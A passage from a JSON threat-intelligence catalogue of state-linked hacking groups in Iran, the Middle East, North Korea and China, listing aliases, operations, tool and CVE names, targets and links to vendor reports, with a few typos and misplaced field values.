"https://www.crowdstrike.com/blog/an-in-depth-analysis-of-samsam-ransomware-and-boss-spider/", "https://www.justice.gov/opa/pr/two-iranian-men-indicted-deploying-ransomware-extort-hospitals-municipalities-and-public", "https://www.secureworks.com/research/samsam-ransomware-campaigns"], "tools": ["SamSam"], "targets": null, "description": null}, {"operations": ["Australian Parliament Hack", "Citrix Hack"], "comment": "NOTHING CONFIRMED YET", "attck_id": null, "names": ["Iridium"], "links": ["https://www.wsj.com/articles/iran-blamed-for-cyberattack-on-australias-parliament-11550736796", "https://www.zdnet.com/article/citrix-discloses-security-breach-of-internal-network/", "https://www.forbes.com/sites/kateoflahertyuk/2019/03/15/who-is-resecurity-the-firm-that-named-the-iranian-group-allegedly-behind-the-citrix-hack/", "https://www.scmagazine.com/home/security-news/apts-cyberespionage/iridium-cyberespionage-gang-behind-aussie-parliament-attacks/"], "tools": ["China Chopper / Ckife Webshells", "LazyCat", "reGeorge"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["DNSpionage"], "links": ["https://blog-cert.opmd.fr/dnspionage-retour-factuel-sur-les-attaques-annoncees-dans-differents-medias/", "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html", "https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/", "https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Inconclusive link to OilRig/APT34", "attck_id": "G0059", "names": ["APT35", "Tortoiseshell", "Imperial Kitten"], "links": ["https://www.cyberscoop.com/saudi-arabia-hackers-it-providers-symantec/", "https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html", "https://www.symantec.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain"], "tools": ["Backdoor.Syskit", "Poison Frog", "Infostealer/Sha.exe/Sha432.exe", "Infostealer/stereoversioncontrol.exe", "get-logon-history.ps1"], "targets": "IT providers in Saudi Arabia", "description": null}, {"operations": ["Bapco Attack"], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://www.wired.com/story/iran-soleimani-cyberattack-hackers/", "https://www.ibm.com/downloads/cas/OAJ4VZNJ?_ga=2.162718588.1703640646.1575470035-355468858.1568634484&cm_mc_uid=62832336079115590460108&cm_mc_sid_50200000=12616311575470030712"], "tools": ["Zerocleare", "DUSTMAN"], "targets": "Oil companies in the middle east", "description": null}, {"operations": [], "comment": "Overlaps with APT33, APT34 and Chafer", "attck_id": null, "names": ["Parasite", "Fox Kitten"], "links": ["https://dragos.com/blog/industry-news/the-state-of-threats-to-electric-entities-in-north-america/", "https://www.clearskysec.com/fox-kitten/"], "tools": ["SSHNET", "Juicy Potato", "Port", "STSRCHECK", "LPManager", "Invoke-SMBClient", "Invoke-SMBEnum", "Invoke-SMBExec", "Invoke-TheHash", "Invoke-WMIExec", "SOCKET-Based Backdoor", "Ngrok"], "targets": null, "description": null}]}}, {"middle_east": {"actors": [{"operations": ["Molerats", "DustySky", "TopHat"], "comment": null, "attck_id": null, "names": ["Gaza Hacker Team", "Gaza cyber gang", "Molerats"], "links": ["https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37", "https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one", "http://pwc.blogs.com/cyber_security_updates/2016/11/molerats-theres-more-to-the-naked-eye.html", "http://www.clearskysec.com/molerats-iec/", "http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html", "https://github.com/kbandla/APTnotes/raw/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf", "http://www.clearskysec.com/dustysky/", "https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team", "https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html", "https://securelist.com/gaza-cybergang-updated-2017-activity", "https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/"], "tools": ["Poison Ivy", "DustySky", "NeD Worm", "Scote", "Don\u2019t Kill My Cat (DKMC)", "RTFs Exploiting CVE-2017-0199"], "targets": "Israel, Palestine, Egypt, Saudi Arabia, United Arab Emirates, Turkey, USA. (Targeted sectors include governmental and diplomatic institutions, including embassies; companies from the aerospace and defence Industries; financial institutions; journalists; software developers.)", "description": "targeted emails with malware. fake website with malicipretending to be a legitimate iOS management software, and linking to it in an online freelancing marketplace."}, {"operations": [], "comment": "Related: Operation Advtravel", "attck_id": null, "names": ["Two-tailed Scorpion", "APT-C-23", "Desert Falcon", "AridViper"], "links": ["https://www.threatconnect.com/blog/kasperagent-malware-campaign/", "https://blog.trendmicro.com/trendlabs-security-intelligence/new-gnatspy-mobile-malware-family-discovered/", "https://securelist.com/blog/incidents/77562/breaking-the-weakest-link-of-the-strongest-chain/", "https://www.proofpoint.com/us/threat-insight/post/Operation-Arid-Viper-Slithers-Back-Into-View", "https://ti.360.com/upload/report/file/APTSWXLVJ8fnjoxck.pdf", "https://blog.lookout.com/blog/2017/02/16/viperrat-mobile-apt/", "http://securityaffairs.co/wordpress/33785/cyber-crime/arid-viper-israel-sex-video.html", "https://securelist.com/blog/research/68817/the-desert-falcons-targeted-attacks/", "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-arid-viper.pdf", "https://www.ci-project.org/blog/2017/3/4/arid-viper", "http://blog.talosintelligence.com/2017/06/palestine-delphi.html"], "tools": [], "targets": "Egypt, Palestine, Israel, Jordan, UAE,Israeli-based organizations in the government, transport/infrastructure, military, and academia. One organization based in Kuwait is also as one of Arid Viper\u2019s victims.", "description": "spear phishing"}, {"operations": [], "comment": "The main threat is sensitive data theft and cyber espionage", "attck_id": null, "names": ["Volatile Cedar"], "links": ["http://blog.checkpoint.com/2015/03/31/volatilecedar/", "http://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf"], "tools": ["Explosive"], "targets": "USA, Canada, UK, Turkey, Lebanon and Israel. Nation-state/political-group interests", "description": "The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism."}, {"operations": [], "comment": null, "attck_id": null, "names": ["Deadeye Jackal", "Syrian Electronic Army (SEA)"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf", "http://blogs.360.cn/post/Syrian_Electronic_Army.html", "http://www.crowdstrike.com/blog/dns-lifeblood-your-domain/"], "tools": ["SeANux: Sea Shell (Basic Web Shell)", "Executer Webshell"], "targets": "Commercial, Financial, Media, Social Networking", "description": null}, {"operations": [], "comment": "Pro-ISIS", "attck_id": null, "names": ["Islamic State Hacking Division", "United Cyber Caliphate (UCC)", "Cyber Caliphate Army (CCA)"], "links": ["https://en.wikipedia.org/wiki/Islamic_State_Hacking_Division", "https://ent.siteintelgroup.com/index.php?option=com_customproperties&view=search&task=tag&bind_to_category=content:37&tagId=697"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Ghost Jackal"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": "Commercial, Energy, Financial", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Corsair Jackal"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": "Commercial, Technology, Financial, Energy", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Extreme Jackal"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": "Military, Government", "description": null}, {"operations": ["Electric Powder"], "comment": null, "attck_id": null, "names": ["Electric Powder"], "links": ["https://www.riskiq.com/blog/analyst/powering-threat-investigations/", "http://www.clearskysec.com/iec/"], "tools": ["Downloader", "keyloger"], "targets": "Israel Electric Company", "description": "spreading malware via fake Facebook profiles and pages, breached websites, self-hosted and cloud based websites"}, {"operations": [], "comment": null, "attck_id": null, "names": ["APT-C-23"], "links": ["https://blog.lookout.com/desert-scorpion-google-play", "https://www.cyberscoop.com/hamas-spyware-desert-scorpion-apt-c-23-google-play-lookout/", "https://blog.lookout.com/frozencell-mobile-threat", "https://ti.360.net/blog/uploads/2017/09/22/f41a337e10e992f17986af386a62c7ad.pdf", "http://researchcenter.paloaltonetworks.com/2017/04/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/"], "tools": ["KASPERAGENT and MICROPSIA", "Desert Scorpion"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Goldmouse", "Golden Rat", "APT-C-27"], "links": ["https://ti.360.net/blog/articles/apt-c-27-(goldmouse):-suspected-target-attack-against-the-middle-east-with-winrar-exploit-en/", "https://securityaffairs.co/wordpress/74670/malware/apt-c-27-syria-espionage.html", "https://blog.360totalsecurity.com/en/the-sample-analysis-of-apt-c-27s-recent-attack/", "https://www.anquanke.com/post/id/94072"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Dark Caracal"], "links": ["https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf"], "tools": ["Pallas Bandook CrossRAT Infected Documents "], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Tempting Cedar"], "links": ["https://blog.avast.com/avast-tracks-down-tempting-cedar-spyware"], "tools": [], "targets": "people in Eastern European and Middle Eastern countries", "description": null}, {"operations": ["Big Bang"], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://research.checkpoint.com/apt-attack-middle-east-big-bang/", "https://blog.talosintelligence.com/2017/06/palestine-delphi.html"], "tools": ["MICROPSIA"], "targets": "Palestinian authorities", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Sandcat"], "links": ["https://securelist.com/zero-day-in-windows-kernel-transaction-manager-cve-2018-8611/89253/"], "tools": ["CHAINSHOT", "FinFisher/FinSpy", "CVE-2018-8589"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Group WITRE"], "links": ["https://www.securityartwork.es/2019/01/25/wirte-group-attacking-the-middle-east/", "https://lab52.io/blog/wirte-group-attacking-the-middle-east/", " https://twitter.com/ItsReallyNick/status/1033413803470467072", "https://twitter.com/jeFF0Falltrades/status/1085247772582912003", "https://www.securityartwork.es/2019/01/18/grupo-wirte-atacando-a-oriente-medio/", " https://twitter.com/ClearskySec/status/1085160222233112577", "https://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"], "tools": [], "targets": "people from the Palestinian authority and UAE", "description": "1. Rar file with a geo-political name in Arabic, usually conerns the Palestinian Authority and Gaza 2. VBS/SCR with the same name.3. Decoy Doc contains copied content that was published by media outlet (modified content)4. Backdoor"}, {"operations": [], "comment": null, "attck_id": null, "names": ["Saber Lion", "APT-C-38", "ZooPark"], "links": ["http://blogs.360.cn/post/analysis-of-APT-C-38.html", "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/05/24122414/ZooPark_for_public_final_edited.pdf"], "tools": [], "targets": "Egypt, Jordan, Morocco, Lebanon, Iran, Iraqi Kurdistan", "description": "Android malware, Windows malware"}, {"operations": [], "comment": null, "attck_id": null, "names": ["Racquet Bear", "Pat Bear", "APT-C-37"], "links": ["https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Unknown/APT-C-37/26-08-19/APT-C-37%20analysis.md", "https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37", "http://blogs.360.cn/post/analysis-of-apt-c-37.html"], "tools": [], "targets": "DroidJack, SpyNote, SSLove, NJRAT, H-Worm", "description": null}]}}, null, {"north_korea": {"actors": [{"operations": ["Blockbuster", "Dark Seoul", "Applejeus"], "comment": "Threat Recon.nshc.net alias=SectorA01", "attck_id": null, "names": ["Whois Hacking Team", "Unit 121", "Bureau 121", "Hidden Cobra", "Appleworm", "Zinc", "NewRomanic Cyber Army Team", "Labyrinth Chollima", "Nickel Academy", "Lazarus Group"], "links": ["https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/", "https://www.darkreading.com/vulnerabilities---threats/lazarus-group-fancy-bear-most-active-threat-groups-in-2017/d/d-id/1330954?print=yes", "https://www.secureworks.com/about/press/media-alert-secureworks-discovers-north-korean-cyber-threat-group-lazarus-spearphishing", "https://threatrecon.nshc.net/2019/01/23/sectora01-custom-proxy-utility-tool-analysis/", "https://objective-see.com/blog/blog_0x49.html", "http://www.fsec.or.kr/common/proc/fsec/bbs/21/fileDownLoad/1235.do", "https://researchcenter.paloaltonetworks.com/2017/08/unit42-blockbuster-saga-continues/", "https://www.alienvault.com/open-threat-exchange/blog/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks", "http://researchcenter.paloaltonetworks.com/2015/11/tdrop2-attacks-suggest-dark-seoul-attackers-return/", "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf", "http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf", "https://www.us-cert.gov/ncas/alerts/TA17-164A", "https://www.crowdstrike.com/blog/unprecedented-announcement-fbi-implicates-north-korea-destructive-attacks/", "https://www.us-cert.gov/ncas/alerts/TA17-318A", "https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity", "https://www.sentinelone.com/blog/lazarus-apt-targets-mac-users-poisoned-word-document/", " https://securelist.com/operation-applejeus/87553/", "https://blogs.microsoft.com/on-the-issues/2017/12/19/microsoft-facebook-disrupt-zinc-malware-attack-protect-customers-internet-ongoing-cyberthreats/", "https://www.us-cert.gov/ncas/alerts/TA17-318B", "https://www.proofpoint.com/sites/default/files/pfpt-us-wp-north-korea-bitten-by-bitcoin-bug.pdf"], "tools": ["Tdrop", "Tdrop2", "Troy", "Destover", "FallChill RAT", "Volgmer", "Hawup", "Manuscrypt", "WolfRAT", "SheepRAT", "HtDnDownLoader"], "targets": "Believed to be responsible for Dark Seoul, Ten Days of Rain, the Sony Pictures Entertainment attack,\u00a0the SWIFT-related bank heists, and WannaCry. Known to the U.S. government as Hidden Cobra. Targeting also BitCoin Exchanges, financial sector, technology/engineering sector", "description": "Delivery: usually via spear phishing email.Infrastructure: C2 often based on compromised servers,moving to own servers paid by bitcoin to preserve anonymityPersistency: tipically launching ransomware after operation to destroy evidences"}, {"operations": ["Erebus", "Golden Time", "Evil New Year", "Are you Happy?", "FreeMilk", "North Korean Human Rights", "Evil New Year 2018"], "comment": "FireEye iSIGHT Intelligence believes that APT37 is aligned with the activity publicly reported as Scarcruft and Group123", "attck_id": null, "names": ["Reaper", "Red Eyes", "APT37", "THALLIUM", "Venus 121 (\uae08\uc131121)", "Ricochet Chollima", "Group123 "], "links": ["https://unit42.paloaltonetworks.com/unit42-reaper-groups-updated-mobile-arsenal/", "https://blog.alyac.co.kr/1985", "https://exchange.xforce.ibmcloud.com/collection/Fear-The-Reaper-North-Korean-Group-APT37-dc96e8bdff7573efb87d43d7584c1fbc", "http://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html", "https://securelist.com/blog/research/75082/cve-2016-4171-adobe-flash-zero-day-used-in-targeted-attacks/", "https://www.fireeye.com/blog/threat-research/2018/02/apt37-overlooked-north-korean-actor.html", "https://unit42.paloaltonetworks.com/unit42-nokki-almost-ties-the-knot-with-dogcall-reaper-group-uses-new-malware-to-deploy-rat/", "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/", "https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/", "https://blogs.microsoft.com/on-the-issues/2019/12/30/microsoft-court-action-against-nation-state-cybercrime/", "https://www.zdnet.com/article/microsoft-takes-down-50-domains-operated-by-north-korean-hackers/?mid=1#cid=8960026"], "tools": ["KARAE", "SOUNDWAVE", "ZUMKONG", "RICECURRY", "CORALDECK", "POORAIM", "SLOWDRIFT", "MILKDROP", "GELCAPSULE", "DOGCALL", "HAPPYWORK", "RUHAPPY", "SHUTTERSPEED", "Flash Exploit CVE-2016-4117", "ROKRAT", "KEVDROID", "BabyShark", "KimJongRAT"], "targets": "Primarily South Korea \u2013 though also Japan, Vietnam and the Middle East \u2013 in various industry verticals, including chemicals, electronics, manufacturing, aerospace, automotive, and healthcare; Scarcruft Tracking: Russia, Nepal, South Korea, China, India, Kuwait and Romania", "description": null}, {"operations": ["Inexsmar", "Daybreak", "Wizard Opium", "Higaisa"], "comment": null, "attck_id": null, "names": ["Tapaoux", "Karba", "Luder", "Dubnium", "SIG25", "APT-C-06", "Nemim", "Fallout Team", "DarkHotel"], "links": ["https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/", "https://translate.google.com/translate?hl=&sl=zh-CN&tl=en&u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FW87E6_v9YCnsmQWDd7NOHw&sandbox=1", "https://www.forcepoint.com/sites/default/files/resources/files/report_jaku_analysis_of_botnet_campaign_en_0.pdf", "https://research.checkpoint.com/silivaccine-a-look-inside-north-koreas-anti-virus/", "http://www.wired.com/2014/11/darkhotel-malware/", "http://drops.wooyun.org/tips/11726", "https://labs.bitdefender.com/wp-content/uploads/downloads/inexsmar-an-unusual-darkhotel-campaign/", "https://securelist.com/blog/research/66779/the-darkhotel-apt/", "https://securelist.com/operation-daybreak/75100/", "https://github.com/aptnotes/data/issues/56", "https://blogs.jpcert.or.jp/en/2016/06/asruex-malware-infecting-through-shortcut-files.html", "https://s.tencent.com/research/report/836.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/asruex-backdoor-variant-infects-word-documents-and-pdfs-through-old-ms-office-and-adobe-vulnerabilities/", "https://blog.trendmicro.com/trendlabs-security-intelligence/asruex-backdoor-variant-infects-word-documents-and-pdfs-through-old-ms-office-and-adobe-vulnerabilities/"], "tools": ["Win32.Karba", "Win32.Pioneer", "CVE-2015-8651", "Asruex", "CVE-2012-0158", "CVE-2010-2883", "CVE-2016-4171 and CVE-2018-817"], "targets": "Japan, Taiwan, China, Russia, and South Korea, North KoreaGovernment, Utilities, High-Tech, Automotive", "description": "Information on Chinese forum indicating group may have targeted CVE-2015-8651, most likely a South Korean actor"}, {"operations": ["DesertWolf", "Vanxatm", "Mayday", "INITROY", "XEDA", "Sony"], "comment": "Lazarus subgroup", "attck_id": null, "names": ["Silent Chollima", "Andariel"], "links": ["http://online.wsj.com/public/resources/documents/print/WSJ_-A006-20170728.pdf", "https://gsec.hitb.org/materials/sg2017/D1%20-%20Ashley%20Shen%20and%20Moonbeom%20Park%20-%20A%20Deep%20Dive%20into%20the%20Digital%20Weapons%20of%20the%20North%20Korean%20Cyber%20Army.pdf", "http://www.fsec.or.kr/user/bbs/fsec/21/13/bbsDataView/910.do", "https://www.scmagazineuk.com/war-plans-including-assassination-plan-stolen-by-north-korean-hackers/article/699089/", "https://blog.trendmicro.com/trendlabs-security-intelligence/new-andariel-reconnaissance-tactics-hint-at-next-targets/"], "tools": ["RifDoor", "Phandoor"], "targets": "Information gathering and profit", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Kimsuky", "Velvet Chollima", "Kimsuki"], "links": ["https://www.dailynk.com/english/north-korean-hackers-mount-phishing-attack-nkhr-groups/", "https://blog.yoroi.company/research/the-north-korean-kimsuky-apt-keeps-threatening-south-korea-evolving-its-ttps/", "https://crowdstrike.lookbookhq.com/web-global-threat-report-2019/crowdstrike-2019-gtr", "https://www.zdnet.com/article/cyber-espionage-group-uses-chrome-extension-to-infect-victims/", "https://apt.securelist.com/#!/threat/972", "http://www.reuters.com/article/us-nuclear-southkorea-northkorea-idUSKBN0MD0GR20150317", "https://asert.arbornetworks.com/stolen-pencil-campaign-targets-academia/", "http://securelist.com/analysis/57915/the-kimsuky-operation-a-north-korean-apt/", "https://www.anomali.com/blog/suspected-north-korean-cyber-espionage-campaign-targets-multiple-foreign-ministries-and-think-tanks#When:14:00:00Z", "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2019-ACT-009.pdf", "https://blog.alyac.co.kr/2243", "https://blog.alyac.co.kr/attachment/cfile5.uf@99A0CD415CB67E210DCEB3.pdf", "https://blog.prevailion.com/2019/09/autumn-aperture-report.html"], "tools": ["KPortScan", "PsExec", "Procdump", "Mimikatz", "Eternal suite of exploits", "NirSoft MailPassView/Network Password Recovery/Remote Desktop PassView/SniffPass/WebBrowserPassView", "Mechanical", "Grease"], "targets": "This threat actor targets South Korean think tanks, industry, nuclear power operators, and the Ministry of Unification for espionage purposes.", "description": null}, {"operations": [], "comment": "NorthKorea vs Samsung", "attck_id": null, "names": ["NoName"], "links": ["http://securityfactory.tistory.com/332"], "tools": ["malware with name \"mySingleMessenger.exe\""], "targets": null, "description": null}, {"operations": [], "comment": "False Positive. APT Training by SK Government", "attck_id": null, "names": ["OnionDog"], "links": ["http://news.softpedia.com/news/korean-energy-and-transportation-targets-attacked-by-oniondog-apt-501534.shtml", "http://zhuiri.360.cn/upload/APT-C-03-en.pdf", "http://www.chinadaily.com.cn/china/2016-03/09/content_23794129.htm", "http://news.softpedia.com/news/korean-energy-and-transportation-targets-attacked-by-oniondog-apt-501534.shtml"], "tools": [], "targets": "This threat actor targets the South Korean government, transportation, and energy sectors.", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["APT38", "TEMP.Hermit"], "links": ["http://www.scmagazine.com/sony-hackers-are-still-hacking-researchers-say/article/474166/", "https://www.fireeye.com/blog/threat-research/2018/10/apt38-details-on-new-north-korean-regime-backed-threat-group.html", "https://www.isightpartners.com/2016/02/threatscape-media-highlights-update-week-of-february-17th/"], "tools": ["VOLGMER", "PEACHPIT"], "targets": "Korean Peninsula, US Aerospace, SWIFT-fraud operations in East Asia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://securingtomorrow.mcafee.com/mcafee-labs/mcafee-uncovers-operation-honeybee-malicious-document-campaign-targeting-humanitarian-aid-groups/"], "tools": ["MaoCheng Dropper"], "targets": "Humanitarian Aid Groups", "description": null}, {"operations": ["Far Eastern International Bank"], "comment": null, "attck_id": null, "names": ["BlueNoroff", "ElectricFish", "APT38", "Stardust Chollima", "Stardust Chollima"], "links": ["https://techcrunch.com/2019/08/15/cyber-command-north-korea-malware/", "https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-april-stardust-chollima/", "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/", "https://app.cdn.lookbookhq.com/lbhq-production/10339/content/original/9dd0e31a-c9c0-4e1c-aea1-f35d3e930f3d/CrowdStrike_GTR_2019_.pdf", "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/"], "tools": ["Dimens", "MBR Killer", "ElectricFish"], "targets": "Latin America, Mexico, Costa Rica, Chile, Argentina, financial institutions in Asia and Africa in 2018", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": [], "links": ["https://www.fireeye.com/blog/threat-research/2018/10/apt38-details-on-new-north-korean-regime-backed-threat-group.html"], "tools": [], "targets": null, "description": "Media, government, but mainly financial institutions in order to raise money for the North Korean regime: Russia, Turkey, US, Poland, Mexico, Brazil, Ururguay, Taiwan, Malaysia, Chile, Vietnam, Philippines"}]}}, {"china": {"actors": [{"operations": ["GhostNet"], "comment": null, "attck_id": "G0006", "names": ["BrownFox", "Comment Panda", "Comment Crew", "APT1", "PLA Unit 61398", "GIF89a, ShadyRAT, Shanghai Group, Byzantine Candor", "TG-8223"], "links": ["http://www.nartv.org/mirror/ghostnet.pdf", "https://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-Espionage-Network", "https://www.secureworks.com/research/analysis-of-dhs-nccic-indicators", "http://www.mcafee.com/us/resources/white-papers/wp-operation-shady-rat.pdf", "http://www.nytimes.com/2013/02/19/technology/chinas-army-is-seen-as-tied-to-hacking-against-us.html?emc=na&_r=2&"], "tools": ["WEBC2", "BISCUIT and many others"], "targets": "U.S. cybersecurity firm Mandiant, later purchased by FireEye, released a report in February 2013 that exposed one of China's cyber espionage units, Unit 61398. The group, which FireEye called APT1, is a unit within China's People's Liberation Army (PLA) that has been linked to a wide range of cyber operations targeting U.S. private sector entities for espionage purposes. The comprehensive report detailed evidence connecting APT1 and the PLA, offered insight into APT1's operational malware and methodologies, and provided timelines of the espionage it conducted.", "description": null}, {"operations": [], "comment": null, "attck_id": "G0024", "names": ["Putter Panda", "APT2", "APT2", "PLA Unit 61486", "SearchFire", "TG-6952"], "links": ["http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf", "http://icitech.org/icit-brief-chinas-espionage-dynasty-economic-death-by-a-thousand-cuts/"], "tools": ["Their activities are commonly known to be exploiting CVE-2012-0158 (MSOffice vulnerability in MSCOMCTL.OCX) in SpearPhising operations. Related malware: Moose", "Warp", "MSUpdater"], "targets": "This threat actor targets firms in the technology (communications, space, aerospace), research, defense, and government sectors in the United States for espionage purposes. The tools and infrastructure it uses overlap with PLA Unit 61398.", "description": null}, {"operations": ["Double Tap", "Clandestine Wolf"], "comment": null, "attck_id": "G0022", "names": ["UPS Team", "Gothic Panda", "UPS", "Buckeye", "APT3", "Boyusec \u2013 the Guangzhou Boyu Information Technology Company, Ltd", "TG-0110"], "links": ["https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit", "https://www.fireeye.com/current-threats/apt-groups.html", "https://www.recordedfuture.com/chinese-mss-behind-apt3/", "http://freebeacon.com/national-security/u-s-indicts-three-chinese-hackers-linked-security-firm/amp/", "https://intrusiontruth.wordpress.com/2017/05/09/apt3-is-boyusec-a-chinese-intelligence-contractor/", "http://www.symantec.com/connect/blogs/buckeye-cyberespionage-group-shifts-gaze-us-hong-kong", "https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-adobe-flash-zero-day.html", "https://intrusiontruth.wordpress.com/2018/05/22/the-destruction-of-apt3/", "http://www.secureworks.com/resources/blog/research/threat-group-0110-targets-manufacturing-and-financial-organizations-via-phishing/", "https://www.washingtonpost.com/world/national-security/china-hacked-a-navy-contractor-and-secured-a-trove-of-highly-sensitive-data-on-submarine-warfare/2018/06/08/6cc396fa-68e6-11e8-bea7-c8eb28bc52b1_story.html?noredirect=on&utm_term=.209df584e031"], "tools": ["Shotput", "Pirpi", "PlugX/Sogu", "Kaba", "Cookie Cutter", "many 0days: IE", "Firefox", "and Flash", "SportLoader", "Shadow Brokers exploits", "DoublePulsar", "Bemstour", "Filensfer"], "targets": "This threat actor targets and compromises entities in the defense, construction, technology, and transportation sectors. Up until 2015, it was primarily focused on U.S. and UK entities, but it shifted to Hong Kong\u00e2\u20ac\u201cbased targets afterward. Aerospace and Defence; Construction and Engineering; Energy; High Tech; Nonprofit; Telecommunications; Transportation", "description": null}, {"operations": [], "comment": null, "attck_id": "G0005", "names": ["BeeBus", "Calc Team", "Numbered Panda", "IXESHE", "APT12", "DynCalc, Crimson Iron, DNSCalc", "TG-2754 (tentative)"], "links": ["http://blog.trendmicro.com/taking-a-bite-out-of-ixeshe/", "http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/", "https://cysinfo.com/sx-2nd-meetup-reversing-and-decrypting-the-communications-of-apt-malware/", "http://www.secureworks.com/cyber-threat-intelligence/threats/analysis-of-dhs-nccic-indicators/", "http://blog.crowdstrike.com/whois-numbered-panda/", "http://www.crowdstrike.com/blog/whois-numbered-panda/", "http://www.computerworld.com/s/article/9241577/The_Chinese_hacker_group_that_hit_the_N.Y._Times_is_back_with_updated_tools?taxonomyId=17", "http://blog.macnica.net/blog/2017/08/post-fb81.html"], "tools": ["Etumbot", "Riptide", "Hightide", "ThreeByte", "Waterspout", "Mswab", "Gh0st", "ShowNews", "3001"], "targets": "This threat actor targets organizations in Japan, Taiwan, and elsewhere in East Asia\u00e2\u20ac\u201dincluding electronics manufacturers and telecommunications companies\u00e2\u20ac\u201dfor espionage purposes.", "description": null}, {"operations": [], "comment": null, "attck_id": "G0023", "names": ["APT16", "APT16"], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/", "https://www.fireeye.com/blog/threat-research/2015/12/the_eps_awakens.html", "https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html"], "tools": ["ELMER backdoor", "Gh0st", "HTRAN", "UNICAT", "Poison Ivy", "Pandora"], "targets": "This threat actor targets and compromises Japanese and Taiwanese entities in the finance, tech, media, and government sectors.", "description": "Spear phishing email delivering a malicious Microsoft Word document exploiting EPS dict copy use-after-free vulnerability, and the local Windows privilege escalation vulnerability CVE-2015-1701. The successful exploitation of both vulnerabilities led to the delivery of either a downloader (IRONHALO), or a backdoor (ELMER). Also known to be using compromised VPN credentials to maintain network persistency. "}, {"operations": [], "comment": null, "attck_id": "G0025", "names": ["Deputy Dog", "Tailgater Team", "Aurora Panda", "Hidden Lynx", "Hidden Lynx", "APT17", "Axiom, SportsFans, Winnti Umbrella"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/crwd-t11-hide_and_seek-how_threat_actors_respond_in_the_face_of_public_exposure.pdf", 